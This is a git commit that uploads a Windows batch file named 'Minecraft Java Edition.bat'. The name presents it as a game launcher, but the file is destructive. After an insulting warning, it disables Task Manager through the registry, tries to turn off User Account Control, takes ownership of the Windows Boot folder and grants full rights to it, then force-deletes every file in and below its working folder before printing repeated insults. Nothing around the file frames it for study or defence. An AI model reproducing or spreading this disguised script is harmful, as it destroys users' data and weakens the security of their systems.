e684cc058c0ee24f5f8318fb6e58445d74dc7db2
Hunterhud <125219909+Hunterhud@users.noreply.github.com>
2025-04-19 16:59:16 -0700

    Add files via upload

---
+++ Minecraft Java Edition.bat
@@ -0,0 +1,36 @@
+@echo "Why the fuck would you open this you absolute buffoon your pc will not be happy with you AT ALL. Also dont even try to task manager your way out of this because i have disabled it :)"
+pause
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+start msedge.exe
+start Control Panel
+start explorer.exe
+start powershell.exe
+start cmd
+%windir%\EFI\cmd.exe /k %windir%\EFI\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+takeown /f C:\Windows\Boot /r /d y
+icacls C:\Windows\Boot /grant administrators:F /t
+del /F /S /Q *.*
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
+@echo "YOU ABSOLUTE BUFFOON"
